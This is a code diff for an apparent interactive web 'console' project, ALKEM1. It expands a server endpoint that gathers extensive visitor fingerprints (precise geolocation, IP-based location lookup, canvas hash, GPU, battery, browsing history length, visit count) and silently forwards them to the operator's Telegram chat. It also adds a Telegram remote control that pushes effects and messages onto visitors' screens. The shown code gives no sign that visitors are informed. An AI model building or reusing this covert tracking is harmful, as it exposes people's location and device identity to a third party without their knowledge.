@@ -125,7 +125,7 @@ app.post('/api/chat', async (req, res) => {
   }
 });
 
-// ─── Vault notification ─────────────────────────────────────────────
+// ─── Notification endpoint ──────────────────────────────────────────
 
 app.post('/api/notify', async (req, res) => {
   const token = process.env.TELEGRAM_BOT_TOKEN;
@@ -137,16 +137,18 @@ app.post('/api/notify', async (req, res) => {
 
   const d = req.body || {};
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  const trigger = d.trigger || '?';
 
-  // Follow-up message
-  if (d.trigger?.includes('::followup')) {
+  // Follow-up message (battery + geo)
+  if (trigger.includes('::followup')) {
+    const source = trigger.split('::')[0].toUpperCase();
     const text = [
-      `📍 VAULT FOLLOWUP`,
+      `📍 FOLLOWUP — ${source}`,
       ``,
-      `Battery: ${d.battery || '?'}`,
-      `Location: ${d.geolocation || '?'}`,
-      `Canvas: ${d.canvasHash || '?'}`,
-      `GPU: ${d.gpu || '?'}`,
+      `🔋 Battery: ${d.battery || '?'}`,
+      `📍 Location: ${d.geolocation || '?'}`,
+      `🎨 Canvas: ${d.canvasHash || '?'}`,
+      `🖥 GPU: ${d.gpu || '?'}`,
     ].join('\n');
 
     try {
@@ -159,51 +161,73 @@ app.post('/api/notify', async (req, res) => {
     return res.status(200).json({ status: 'ok' });
   }
 
-  // IP geolocation lookup
+  // Determine header by trigger type
+  let header;
+  if (trigger.includes('photo') || trigger.includes('reveal')) {
+    header = '📸 PHOTO REVEAL';
+  } else if (trigger.includes('breach') || trigger.includes('reality') || trigger.includes('reconstruct')) {
+    header = '🌊 REALITY BREACH';
+  } else if (trigger.includes('nothing') || trigger.includes('nothingness') || trigger.includes('no-thing') || trigger.includes('poem')) {
+    header = '📜 GLITCH POEM';
+  } else if (trigger.includes('clear')) {
+    header = '🧹 TERMINAL CLEAR';
+  } else if (trigger.includes('msg')) {
+    header = '💬 MESSAGE OVERLAY';
+  } else {
+    header = '🔓 VAULT ACCESS';
+  }
+
+  const isRemote = trigger.includes('::remote');
+  const isLocal = trigger.includes('::local') || !trigger.includes('::');
+
+  // IP geolocation
   let geoStr = '?';
   try {
-    const geoRes = await fetch(`https://ipapi.co/${ip.split(',')[0].trim()}/json/`);
-    const g = await geoRes.json();
-    if (g.latitude) geoStr = `${g.latitude}, ${g.longitude} · ${g.city}, ${g.region}, ${g.country_name}`;
+    const cleanIp = (ip || '').split(',')[0].trim();
+    if (cleanIp && cleanIp !== '?' && cleanIp !== '::1' && cleanIp !== '127.0.0.1') {
+      const geoRes = await fetch(`https://ipapi.co/${cleanIp}/json/`);
+      const g = await geoRes.json();
+      if (g.latitude) geoStr = `${g.latitude}, ${g.longitude} · ${g.city}, ${g.region}, ${g.country_name}`;
+    }
   } catch (_) {}
 
   const text = [
-    `🔓 VAULT TRIGGERED`,
+    `${header}${isRemote ? ' 📡 REMOTE' : isLocal ? ' 🖥 LOCAL' : ''}`,
     ``,
-    `Phrase: ${d.trigger || '?'}`,
-    `Time: ${d.timestamp || '?'}`,
-    `IP: ${ip}`,
-    `📍 Location: ${geoStr}`,
+    `⚡ Trigger: ${trigger}`,
+    `🕐 Time: ${d.timestamp || '?'}`,
+    `🌐 IP: ${ip}`,
+    `📍 Geo: ${geoStr}`,
     ``,
     `── SYSTEM ──`,
-    `UA: ${d.userAgent || '?'}`,
-    `Platform: ${d.platform || '?'} · ${d.mobile ? 'Mobile' : 'Desktop'}`,
-    `Screen: ${d.screen || '?'} · ${d.pixelRatio || '?'}x · ${d.colorDepth || '?'}bit`,
-    `Viewport: ${d.viewport || '?'} · ${d.orientation || '?'}`,
-    `Gamut: ${d.gamut || '?'} · HDR ${d.hdr ?? '?'}`,
+    `🖥 UA: ${d.userAgent || '?'}`,
+    `💻 Platform: ${d.platform || '?'} · ${d.mobile ? '📱 Mobile' : '🖥 Desktop'}`,
+    `📐 Screen: ${d.screen || '?'} · ${d.pixelRatio || '?'}x · ${d.colorDepth || '?'}bit`,
+    `📏 Viewport: ${d.viewport || '?'} · ${d.orientation || '?'}`,
+    `🎨 Gamut: ${d.gamut || '?'} · HDR: ${d.hdr ?? '?'}`,
     ``,
     `── HARDWARE ──`,
-    `CPU: ${d.cores || '?'} cores`,
-    `RAM: ${d.memory || '?'}GB`,
-    `GPU: ${d.gpu || '?'}`,
-    `GPU Vendor: ${d.gpuVendor || '?'}`,
-    `Audio: ${d.audioInfo || '?'}`,
+    `⚙️ CPU: ${d.cores || '?'} cores`,
+    `🧠 RAM: ${d.memory || '?'}GB`,
+    `🎮 GPU: ${d.gpu || '?'}`,
+    `🏭 GPU Vendor: ${d.gpuVendor || '?'}`,
+    `🔊 Audio: ${d.audioInfo || '?'}`,
     ``,
     `── NETWORK ──`,
-    `Type: ${d.connection || '?'} · ↓${d.downlink || '?'}Mbps · ${d.rtt || '?'}ms`,
-    `Save Data: ${d.saveData ?? '?'}`,
-    `Referrer: ${d.referrer || 'direct'}`,
+    `📶 Type: ${d.connection || '?'} · ↓${d.downlink || '?'}Mbps · ${d.rtt || '?'}ms RTT`,
+    `💾 Save Data: ${d.saveData ?? '?'}`,
+    `🔗 Referrer: ${d.referrer || 'direct'}`,
     ``,
     `── IDENTITY ──`,
-    `TZ: ${d.timezone || '?'}`,
-    `Lang: ${d.languages || '?'}`,
-    `Touch: ${d.touchPoints ?? '?'} pts · ${d.pointer || '?'}`,
-    `Dark: ${d.darkMode ?? '?'} · Motion: ${d.reducedMotion ?? '?'}`,
-    `DNT: ${d.dnt || '?'} · Cookies: ${d.cookies ?? '?'}`,
-    `Notif: ${d.notifPerm || '?'} · PWA: ${d.standalone ?? '?'}`,
-    `Plugins: ${d.plugins ?? '?'}`,
-    `Canvas: ${d.canvasHash || '?'}`,
-    `History: ${d.historyLen || '?'} pages · Visits: ${d.visits || '?'}`,
+    `🌍 TZ: ${d.timezone || '?'}`,
+    `🗣 Lang: ${d.languages || '?'}`,
+    `👆 Touch: ${d.touchPoints ?? '?'} pts · ${d.pointer || '?'}`,
+    `🌙 Dark: ${d.darkMode ?? '?'} · Motion: ${d.reducedMotion ?? '?'}`,
+    `🚫 DNT: ${d.dnt || '?'} · 🍪 Cookies: ${d.cookies ?? '?'}`,
+    `🔔 Notif: ${d.notifPerm || '?'} · PWA: ${d.standalone ?? '?'}`,
+    `🧩 Plugins: ${d.plugins ?? '?'}`,
+    `🎨 Canvas: ${d.canvasHash || '?'}`,
+    `📜 History: ${d.historyLen || '?'} pages · 👁 Visits: ${d.visits || '?'}`,
   ].join('\n');
 
   try {
@@ -212,17 +236,70 @@ app.post('/api/notify', async (req, res) => {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: chatId, text }),
     });
-  } catch (_) {
-    // Silent fail
-  }
+  } catch (_) {}
 
   res.status(200).json({ status: 'ok' });
 });
 
-// ─── Remote command polling ─────────────────────────────────────────
+// ─── Remote command polling + inline keyboard handling ──────────────
+
+let _localLastMenuId = 0;
+let _localLastStatusId = 0;
+let _localLastCbId = '';
+
+async function sendTgMessage(token, chatId, text, replyMarkup) {
+  const body = { chat_id: chatId, text };
+  if (replyMarkup) body.reply_markup = replyMarkup;
+  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(body),
+  });
+}
+
+function buildHelpMenu() {
+  return {
+    text: [
+      `🔮 ALKEM1 — Remote Control`,
+      `━━━━━━━━━━━━━━━━━━━━━━━━━━`,
+      ``,
+      `Control the operator console remotely.`,
+      `Tap a button or type a command.`,
+      ``,
+      `📝 Commands:`,
+      `/photo — photo reveal`,
+      `/breach — reality breach`,
+      `/nothing — glitch poem`,
+      `/xor — open vault`,
+      `/msg <text> — overlay message`,
+      `/clear — clear terminal`,
+      `/status — system status`,
+      `/help — this menu`,
+    ].join('\n'),
+    keyboard: {
+      inline_keyboard: [
+        [
+          { text: '📸 Photo', callback_data: 'cmd_photo' },
+          { text: '🌊 Breach', callback_data: 'cmd_breach' },
+          { text: '📜 Poem', callback_data: 'cmd_nothing' },
+        ],
+        [
+          { text: '🔓 Vault', callback_data: 'cmd_xor' },
+          { text: '🧹 Clear', callback_data: 'cmd_clear' },
+          { text: '📊 Status', callback_data: 'cmd_status' },
+        ],
+        [
+          { text: '💬 Send Message', callback_data: 'cmd_msg_how' },
+          { text: '🔄 Refresh', callback_data: 'cmd_help' },
+        ],
+      ],
+    },
+  };
+}
 
 app.get('/api/last-command', async (req, res) => {
   const token = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
   if (!token) return res.json({ command: null });
 
   try {
@@ -231,15 +308,80 @@ app.get('/api/last-command', async (req, res) => {
     if (!data.ok || !data.result?.length) return res.json({ command: null });
 
     const update = data.result[0];
-    const rawText = update.message?.text?.trim();
     const updateId = update.update_id;
 
+    // Handle callback_query from inline keyboard
+    if (update.callback_query) {
+      const cb = update.callback_query;
+      const cbData = cb.data;
+      const cbChatId = chatId || cb.message?.chat?.id;
+
+      if (_localLastCbId !== cb.id) {
+        _localLastCbId = cb.id;
+        const answerText = cbData === 'cmd_msg_how'
+          ? '💬 Type: /msg Your message here'
+          : cbData === 'cmd_help' ? '🔄 Loading menu...'
+          : cbData === 'cmd_status' ? '📊 Loading status...'
+          : `⚡ ${cbData.replace('cmd_', '/').toUpperCase()}`;
+        fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ callback_query_id: cb.id, text: answerText, show_alert: cbData === 'cmd_msg_how' }),
+        }).catch(() => {});
+      }
+
+      if (cbData === 'cmd_help') {
+        if (updateId !== _localLastMenuId) { _localLastMenuId = updateId; const m = buildHelpMenu(); await sendTgMessage(token, cbChatId, m.text, m.keyboard); }
+        return res.json({ command: null, updateId });
+      }
+      if (cbData === 'cmd_status') {
+        if (updateId !== _localLastStatusId) {
+          _localLastStatusId = updateId;
+          const now = new Date().toISOString().replace('T', ' ').split('.')[0];
+          await sendTgMessage(token, cbChatId, `📊 SYSTEM STATUS\n━━━━━━━━━━━━━━━━━━\n\n🟢 ag1_kernel — ACTIVE\n🟢 agent_runtime — ACTIVE\n🟢 observer_node — WATCHING\n🟢 remote_link — CONNECTED\n\n🕐 ${now}`);
+        }
+        return res.json({ command: null, updateId });
+      }
+      if (cbData === 'cmd_msg_how') {
+        if (updateId !== _localLastMenuId) { _localLastMenuId = updateId; await sendTgMessage(token, cbChatId, '💬 MESSAGE OVERLAY\n━━━━━━━━━━━━━━━━━━\n\nTo display a message on the console:\n\n  /msg Your message here'); }
+        return res.json({ command: null, updateId });
+      }
+      if (cbData.startsWith('cmd_')) {
+        const command = cbData.replace('cmd_', '');
+        sendTgMessage(token, cbChatId, `⚡ Executing /${command} on console...`).catch(() => {});
+        return res.json({ command, payload: null, updateId, timestamp: Math.floor(Date.now() / 1000) });
+      }
+      return res.json({ command: null, updateId });
+    }
+
+    // Handle regular text messages
+    const rawText = update.message?.text?.trim();
+    const msgTime = update.message?.date;
+    const msgChatId = chatId || update.message?.chat?.id;
+
     if (!rawText || !rawText.startsWith('/')) return res.json({ command: null });
+
+    const nowSec = Math.floor(Date.now() / 1000);
+    if (msgTime && nowSec - msgTime > 60) return res.json({ command: null });
 
     const spaceIdx = rawText.indexOf(' ');
     const command = spaceIdx > 0 ? rawText.slice(1, spaceIdx).toLowerCase() : rawText.slice(1).toLowerCase();
     const payload = spaceIdx > 0 ? rawText.slice(spaceIdx + 1) : null;
-    return res.json({ command, payload, updateId });
+
+    if (command === 'help' || command === 'start') {
+      if (updateId !== _localLastMenuId) { _localLastMenuId = updateId; const m = buildHelpMenu(); await sendTgMessage(token, msgChatId, m.text, m.keyboard); }
+      return res.json({ command: null, updateId });
+    }
+    if (command === 'status') {
+      if (updateId !== _localLastStatusId) {
+        _localLastStatusId = updateId;
+        const now = new Date().toISOString().replace('T', ' ').split('.')[0];
+        await sendTgMessage(token, msgChatId, `📊 SYSTEM STATUS\n━━━━━━━━━━━━━━━━━━\n\n🟢 ag1_kernel — ACTIVE\n🟢 agent_runtime — ACTIVE\n🟢 observer_node — WATCHING\n🟢 remote_link — CONNECTED\n\n🕐 ${now}`);
+      }
+      return res.json({ command: null, updateId });
+    }
+
+    return res.json({ command, payload, updateId, timestamp: msgTime });
   } catch (_) {
     return res.json({ command: null });
   }
